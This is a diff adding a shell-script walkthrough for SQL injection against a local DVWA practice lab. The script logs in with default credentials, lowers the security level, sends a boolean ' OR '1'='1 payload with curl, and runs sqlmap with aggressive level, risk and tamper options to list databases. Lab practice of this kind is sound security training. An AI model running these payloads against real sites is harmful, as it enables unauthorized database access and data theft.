@@ -1,0 +1,79 @@
+# show where you are (should be your home)
+cd ~
+pwd
+
+# show cookie file and content
+ls -l cookies.txt
+sed -n '1,120p' cookies.txt
+
+#re-login attempt
+curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
+
+#set security to low
+curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
+
+#Check results
+sed -n '1,120p' cookies.txt
+
+#Test the SQLi page using the cookie file
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+
+
+#Quick bypass-test (force cookie header) — if step 3 still 302
+SESSION=$(grep PHPSESSID cookies.txt | awk '{print $7}'); echo "SESSION=$SESSION"
+
+
+#Now test with an explicit cookie header:
+curl -s -I --cookie "PHPSESSID=${SESSION}; security=low" "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+#Good result: HTTP/1.1 200 OK.
+#If this returns 200 OK but step 3 returned 302, use this --cookie="PHPSESSID=...; security=low" approach with sqlmap (below). If this also returns 302, go to step 5.
+
+#Check DVWA setup / database tables (only if still redirecting)
+#If DVWA setup wasn’t completed the app will redirect to setup. Open in browser:
+#http://127.0.0.1/dvwa/setup.php and click Create / Reset Database.
+#Or from the terminal:
+# check DVWA tables exist
+mysql -u dvwauser -p -D dvwa -e "SHOW TABLES;"  # enter dvwapass when prompted
+
+
+#Manual quick test to confirm injection is visible (once you have 200 OK)
+curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -o /tmp/sqli_normal.html
+
+
+#Save a boolean-injected page:
+curl -s -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit" -o /tmp/sqli_inj.html
+
+##Compare first lines:
+##If injected page looks different (extra rows or content changed) — manual injection works and sqlmap will succeed.
+echo "---- normal ----"; head -n 40 /tmp/sqli_normal.html
+echo "---- injected ----"; head -n 40 /tmp/sqli_inj.html
+
+
+#Run sqlmap (use cookie file or the forced header)
+#If step 3 returned 200 OK using -b cookies.txt:
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
+tail -n 30 sqlmap-dbs.txt
+
+
+#If step 4 (forced cookie header) returned 200 OK but -b cookies.txt did not, use:
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
+tail -n 30 sqlmap-dbs.txt
+
+
+##If sqlmap still says not injectable, rerun with more aggressive options:
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=5 --risk=3 --technique=BEU --random-agent --tamper=space2comment --dbs | tee sqlmap-aggr.txt
+tail -n 30 sqlmap-aggr.txt
+
+
+##TL;DR — what to run now (one-shot sequence)
+##Copy-paste these in order (one by one). After the final curl -I, tell me the exact output you get:
+##If the last line prints HTTP/1.1 200 OK, run the sqlmap command shown above. If it still prints 302, copy and paste the last curl -I output you see and I will tell you the single command to run next.
+cd ~
+sed -n '1,120p' cookies.txt
+curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
+curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
+sed -n '1,120p' cookies.txt
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,12p'
